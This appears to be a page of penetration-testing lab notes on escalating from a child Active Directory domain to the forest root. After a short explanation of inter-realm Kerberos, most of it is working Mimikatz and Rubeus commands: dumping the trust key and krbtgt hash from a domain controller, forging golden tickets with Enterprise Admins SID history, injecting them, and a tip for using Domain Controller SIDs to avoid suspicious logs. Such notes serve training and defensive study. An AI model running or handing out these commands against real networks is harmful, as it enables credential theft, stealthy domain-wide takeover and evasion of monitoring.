---
title: "Cross-Domain Attacks"
description: "Cross-domain attacks."
lead: "Child-to-parent domain attacks using krbtgt hash and trust key."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "trust_attacks"
weight: 10
toc: true
---

## General

- Domains in the same forest have an implicit two-way trust relationship
- There is a trust key between the parent and child domains
- There are two ways of escalating privileges between two domains of the same forest
  - Krbtgt hash
  - Trust tickets

### Authentication Process for Resource in Different Domain

1. Client requests TGT from DC in own domain
2. DC sends back TGT
3. Client shows TGT when requesting TGS for resource in another domain
4. DC checks global catalog and finds resource in another domain
5. DC sends back inter-realm TGT encrypted with Trust Key
6. Client sends inter-realm TGT when requesting TGS for resource to DC of target domain
7. DC checks if trust key is valid
8. If yes, sends back TGS
9. Client presents TGS when accessing target resource
10. Target resource checks if client can access resource

## Exploitation

### Child to Forest Root using Trust Key

- Vulnerable step here is step 6, sending the TGT encrypted with trust key
- If we have the trust key, we can forge a ticket
- Escalate privileges from Domain Admin in current domain to Enterprise Admin or DA in forest root

#### Arguments

| Argument | Description |
| --- | --- |
| kerberos::golden | Module name |
| /domain:domain:dollarcorp.moneycorp.local | FQDN of current domain |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the currentdomain |
| /User:Administrator | User to impersonate |
| /target:moneycorp.local | FQDN of the target/parent domain |
| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of the Enterprise Admins group of the parent/target domain |
| /rc4:200a7dab8e762344bd76a62acac42568 | RC4 hash of the trust key |
| /ticket:trust_tgt.kirbi | Save ticket to file for later use |
| /startoffset:0 | Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future. |
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |
| /ptt | Inject ticket in current PowerShell process |

#### Commands

```powershell
# Dump trust key from DC with mimikatz
# Look for [In] trust key from child to parent
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'

# Get SID of Enterprise Admins Group using PowerView 3.0
Get-DomainGroup -Domain moneycorp.local "Enterprise Admins" | Select objectsid

# Forge inter-realm TGT
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /target:moneycorp.local /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:200a7dab8e762344bd76a62acac42568 /service:krbtgt /ticket:trust_key_tgt.kirbi"'

# Use inter-realm ticket to get and use TGS for CIFS service on DC of the parent domain
.\Rubeus.exe asktgs /ticket:trust_key_tgt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

# Check access
ls \\mcorp-dc.moneycorp.local\c$
```

### Child to Forest Root using krbtgt Hash

- Same principle as using trust key
- But: no need to explicitly request TGS for specific service
- Works like golden ticket

```powershell
# Dump krbtgt hash with DA privileges
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Forge inter-realm TGT
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:trust_krbtgt_tgt.kirbi"'

# Avoid suspicious logs by using SID of Domain Controllers and Enterprise Domain Controllers
# S-1-5-21 = Domain Controllers
# S-1-5-9  = Enterprise Domain Controllers
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:dcorp-dc$ /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:trust_krbtgt_tgt.kirbi"'

# Inject ticket into session
Invoke-Mimikatz -Command '"kerberos::ptt trust_krbtgt_tgt.kirbi"'
```
